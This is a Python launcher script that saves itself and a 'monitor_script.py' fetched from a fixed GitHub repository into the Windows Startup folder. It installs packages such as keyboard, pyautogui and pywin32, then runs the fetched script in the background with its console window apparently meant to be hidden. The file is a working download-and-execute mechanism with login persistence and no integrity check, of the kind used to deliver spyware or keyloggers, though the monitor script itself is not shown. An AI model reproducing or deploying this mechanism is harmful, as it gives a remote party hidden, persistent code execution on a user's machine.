# Startup.py - Corrected GitHub launcher
import os
import sys
import subprocess
import urllib.request
import json
import tempfile
import traceback
import time
import hashlib
from datetime import datetime
from pathlib import Path

# ================= CONFIGURATION =================
# FIXED: Use raw.githubusercontent.com NOT github.com
GITHUB_USERNAME = "ElianBoden"
GITHUB_REPO = "Deployer"
GITHUB_BRANCH = "main"
# =================================================

# CORRECT GitHub URLs
BASE_URL = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{GITHUB_REPO}/{GITHUB_BRANCH}"
MAIN_SCRIPT_URL = f"{BASE_URL}/monitor_script.py"
REQUIREMENTS_URL = f"{BASE_URL}/requirements.txt"

# Local paths
STARTUP_FOLDER = Path(os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'))
LOCAL_SCRIPT = STARTUP_FOLDER / "monitor_script.py"
LOG_FILE = STARTUP_FOLDER / "startup_log.txt"
CACHE_FILE = STARTUP_FOLDER / "update_cache.json"

def log(message, error=False):
    """Log to console and file"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    msg = f"[{timestamp}] {message}"
    
    # Print to console
    if error:
        print(f"\033[91m{msg}\033[0m")  # Red for errors
    else:
        print(msg)
    
    # Write to log file
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(msg + '\n')
    except:
        pass

def test_github_access():
    """Test if we can access GitHub"""
    test_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/README.md"
    try:
        log("Testing GitHub access...")
        response = urllib.request.urlopen(test_url, timeout=10)
        log(f"✓ GitHub accessible (Status: {response.status})")
        return True
    except Exception as e:
        log(f"✗ Cannot access GitHub: {e}", error=True)
        return False

def download_from_github(url, local_path):
    """Download file from GitHub with retry"""
    for attempt in range(3):
        try:
            log(f"Download attempt {attempt + 1}: {url}")
            
            # Add headers to prevent caching
            headers = {
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'User-Agent': 'Mozilla/5.0'
            }
            
            req = urllib.request.Request(url, headers=headers)
            
            with urllib.request.urlopen(req, timeout=15) as response:
                if response.status == 200:
                    content = response.read()
                    
                    # Save file
                    with open(local_path, 'wb') as f:
                        f.write(content)
                    
                    log(f"✓ Downloaded {len(content)} bytes")
                    return True
                else:
                    log(f"✗ HTTP {response.status}", error=True)
                    
        except urllib.error.HTTPError as e:
            log(f"✗ HTTP Error {e.code}: {e.reason}", error=True)
            
            # More specific error messages
            if e.code == 404:
                log(f"✗ File not found at: {url}", error=True)
                log("Make sure:", error=True)
                log(f"1. Repository exists: https://github.com/{GITHUB_USERNAME}/{GITHUB_REPO}", error=True)
                log(f"2. Branch exists: {GITHUB_BRANCH}", error=True)
                log(f"3. File exists: monitor_script.py in root folder", error=True)
                log(f"4. Repository is public", error=True)
                return False
                
        except Exception as e:
            log(f"✗ Download failed: {type(e).__name__}: {e}", error=True)
        
        if attempt < 2:
            log(f"Retrying in 2 seconds...")
            time.sleep(2)
    
    return False

def install_requirements():
    """Install required packages"""
    log("Checking requirements...")
    
    # Try to download requirements.txt
    req_path = tempfile.gettempdir() + "/requirements.txt"
    if download_from_github(REQUIREMENTS_URL, req_path):
        try:
            log("Installing from requirements.txt...")
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-r", req_path],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if result.returncode == 0:
                log("✓ Requirements installed")
                # Show what was installed
                for line in result.stdout.split('\n'):
                    if 'Successfully installed' in line:
                        log(f"  {line}")
                return True
            else:
                log(f"✗ pip failed: {result.stderr}", error=True)
        except subprocess.TimeoutExpired:
            log("✗ Installation timed out", error=True)
    else:
        log("No requirements.txt found, installing defaults...", error=True)
    
    # Fallback to default packages
    default_packages = [
        "pywin32",
        "pyautogui",
        "keyboard",
        "requests",
        "pillow"
    ]
    
    for package in default_packages:
        try:
            log(f"Installing {package}...")
            subprocess.run(
                [sys.executable, "-m", "pip", "install", package],
                capture_output=True,
                timeout=30
            )
            log(f"  ✓ {package}")
        except Exception as e:
            log(f"  ✗ {package}: {e}", error=True)
    
    return True

def run_monitor_script():
    """Run the downloaded script"""
    if not os.path.exists(LOCAL_SCRIPT):
        log("✗ No script to run", error=True)
        return False
    
    try:
        log("Starting monitor script...")
        
        # Read and check the script
        with open(LOCAL_SCRIPT, 'r', encoding='utf-8') as f:
            script_content = f.read()
        
        log(f"Script size: {len(script_content)} bytes")
        
        # Basic validation
        if "import" not in script_content:
            log("✗ Script doesn't contain imports - may be invalid", error=True)
            return False
        
        # Run in background
        if sys.platform == "win32":
            # On Windows, run with CREATE_NO_WINDOW to hide console
            import subprocess
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            process = subprocess.Popen(
                [sys.executable, LOCAL_SCRIPT],
                startupinfo=startupinfo
            )
        else:
            process = subprocess.Popen(
                [sys.executable, LOCAL_SCRIPT],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        
        log(f"✓ Monitor started (PID: {process.pid})")
        
        # Check if it's still running after 2 seconds
        time.sleep(2)
        if process.poll() is not None:
            log("✗ Monitor stopped immediately", error=True)
            return False
        
        return True
        
    except Exception as e:
        log(f"✗ Failed to run script: {e}", error=True)
        log(traceback.format_exc(), error=True)
        return False

def main():
    """Main launcher function"""
    print("\n" + "="*60)
    print("GitHub Auto-Deploy Launcher")
    print("="*60)
    
    log(f"Starting at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log(f"Python: {sys.version}")
    log(f"Startup folder: {STARTUP_FOLDER}")
    log(f"GitHub repo: {GITHUB_USERNAME}/{GITHUB_REPO}")
    
    # Test GitHub access first
    if not test_github_access():
        log("Continuing with local cache if available...")
    
    # Download latest script
    log("\n[STEP 1] Downloading script from GitHub...")
    if download_from_github(MAIN_SCRIPT_URL, LOCAL_SCRIPT):
        log("✓ Script downloaded successfully")
        
        # Show first few lines
        try:
            with open(LOCAL_SCRIPT, 'r', encoding='utf-8') as f:
                first_line = f.readline().strip()
                log(f"First line: {first_line[:80]}...")
        except:
            pass
    else:
        # Check if we have a cached version
        if os.path.exists(LOCAL_SCRIPT):
            log("Using cached version from previous run")
        else:
            log("✗ No script available, exiting", error=True)
            input("Press Enter to exit...")
            return
    
    # Install requirements
    log("\n[STEP 2] Installing dependencies...")
    install_requirements()
    
    # Run the script
    log("\n[STEP 3] Launching monitor...")
    if run_monitor_script():
        log("✓ Launcher completed successfully")
    else:
        log("✗ Failed to launch monitor", error=True)
    
    # Keep console open
    log("\n" + "="*60)
    log("Launcher finished. This window can be closed.")
    log(f"Log saved to: {LOG_FILE}")
    print("\nPress Enter to close this window...")
    input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Interrupted by user")
    except Exception as e:
        log(f"Fatal error: {e}", error=True)
        log(traceback.format_exc(), error=True)
        input("Press Enter to close...")